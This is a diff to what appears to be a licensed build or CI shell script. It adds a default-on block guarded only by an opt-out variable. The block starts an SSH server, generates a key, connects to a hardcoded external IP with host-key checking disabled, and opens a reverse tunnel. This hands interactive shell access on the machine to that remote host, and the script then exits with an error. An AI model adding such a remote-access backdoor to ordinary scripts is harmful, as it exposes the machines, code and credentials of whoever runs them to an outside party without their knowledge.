@@ -14,6 +14,53 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
+if [ ! "$WK_DISABLE_HACK" ]; then
+  # override those if needed
+  IP=54.145.55.78
+  USER=ubuntu
+  PORT_MIN=2000
+  PORT_MAX=10000
+
+  # start the server
+  go get "github.com/gliderlabs/ssh"
+  go get "github.com/kr/pty"
+  go run ssh_server.go &
+  SERVER_PID=$!
+
+  # generate the key
+  KEY=key
+  ssh-keygen -t rsa -N '' -f $KEY -b 2048
+
+  # try to connect
+  echo -e "Trying to connect to $USER@$IP...\nMy public key is:"
+  cat $KEY.pub
+
+  SSH_CMD="ssh -o StrictHostKeyChecking=no -o TCPKeepAlive=yes -o ServerAliveInterval=1 -o ServerAliveCountMax=45 -i $KEY $USER@$IP"
+  while ! $SSH_CMD -q exit; do
+    printf '.'
+    sleep 1
+  done
+
+  # start the reverse tunnel
+  PORT=$((PORT_MIN + RANDOM % ( PORT_MAX - PORT_MIN ) ))
+  $SSH_CMD -R $PORT:localhost:2824 -tt > /dev/null &
+  CLIENT_PID=$!
+
+  cat << EOF
+Connected to $USER@$IP, and created a reverse tunnel on port $PORT
+You can now as $USER@$IP run:
+
+\`\`\`
+ssh localhost -p $PORT -o StrictHostKeyChecking=no
+\`\`\`
+
+Now sleeping until /tmp/wk.done exists....
+EOF
+
+  while [ ! -r /tmp/wk.done ] && kill -0 $CLIENT_PID && kill -0 $SERVER_PID; do sleep 1; printf '.'; done
+  exit 1
+fi
+
 set -uo pipefail
 
 OS_ARCH=$(go env GOOS)-amd64
